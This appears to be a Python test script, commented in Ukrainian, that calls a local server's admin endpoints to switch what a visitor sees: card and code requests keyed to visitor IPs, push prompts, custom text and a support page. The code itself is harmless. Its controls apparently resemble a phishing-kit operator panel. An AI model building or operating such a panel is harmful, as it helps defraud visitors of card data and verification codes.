#!/usr/bin/env python3
"""
Простий тест для перевірки роботи кнопок
"""

import requests
import json

def test_server_connection():
    """Тестуємо підключення до сервера"""
    print("🧪 Тестуємо підключення до сервера...")
    
    try:
        response = requests.get('http://127.0.0.1:8080/')
        print(f"✅ Сервер доступний: {response.status_code}")
        return True
    except Exception as e:
        print(f"❌ Сервер недоступний: {e}")
        return False

def test_admin_action():
    """Тестуємо admin_action endpoint"""
    print("🧪 Тестуємо admin_action endpoint...")
    
    actions = ['card', 'block', 'unblock', 'code']
    for action in actions:
        data = {
            'action': action,
            'ip': '192.168.1.1'
        }
        
        try:
            response = requests.post('http://127.0.0.1:8080/admin_action', json=data)
            print(f"✅ {action}: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"❌ {action} помилка: {e}")

def test_push_flag():
    """Тестуємо set_push_flag endpoint"""
    print("🧪 Тестуємо set_push_flag endpoint...")
    
    data = {
        'page_code': '1-89',
        'type': 'push'
    }
    
    try:
        response = requests.post('http://127.0.0.1:8080/set_push_flag', json=data)
        print(f"✅ set_push_flag: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"❌ set_push_flag помилка: {e}")

def test_support_flag():
    """Тестуємо set_support_flag endpoint"""
    print("🧪 Тестуємо set_support_flag endpoint...")
    
    data = {
        'ip': '192.168.1.1',
        'type': 'support'
    }
    
    try:
        response = requests.post('http://127.0.0.1:8080/set_support_flag', json=data)
        print(f"✅ set_support_flag: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"❌ set_support_flag помилка: {e}")

def test_custom_text():
    """Тестуємо set_custom_text endpoint"""
    print("🧪 Тестуємо set_custom_text endpoint...")
    
    data = {
        'text_id': 'test123',
        'text': 'Тестове повідомлення'
    }
    
    try:
        response = requests.post('http://127.0.0.1:8080/set_custom_text', json=data)
        print(f"✅ set_custom_text: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"❌ set_custom_text помилка: {e}")

def test_request_again():
    """Тестуємо set_request_again endpoint"""
    print("🧪 Тестуємо set_request_again endpoint...")
    
    data = {
        'code': 'test_code_123'
    }
    
    try:
        response = requests.post('http://127.0.0.1:8080/set_request_again', json=data)
        print(f"✅ set_request_again: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"❌ set_request_again помилка: {e}")

def main():
    """Головна функція тестування"""
    print("🚀 Починаємо тестування кнопок...")
    print("=" * 50)
    
    # Тестуємо підключення
    if not test_server_connection():
        print("❌ Сервер недоступний, тестування зупинено")
        return
    
    print()
    
    # Тестуємо різні endpoint'и
    test_admin_action()
    test_push_flag()
    test_support_flag()
    test_custom_text()
    test_request_again()
    
    print()
    print("=" * 50)
    print("✅ Тестування завершено!")
    print("💡 Якщо всі тести пройшли успішно, кнопки повинні працювати")
    print("\n📋 Очікувана поведінка кнопок:")
    print("• Code - показує сторінку з запитом коду на сайті")
    print("• Push - показує push-повідомлення на сайті")
    print("• Text - запитує текст і показує його на сайті")
    print("• Тех поддержка - завантажує сторінку техпідтримки")

if __name__ == "__main__":
    main()
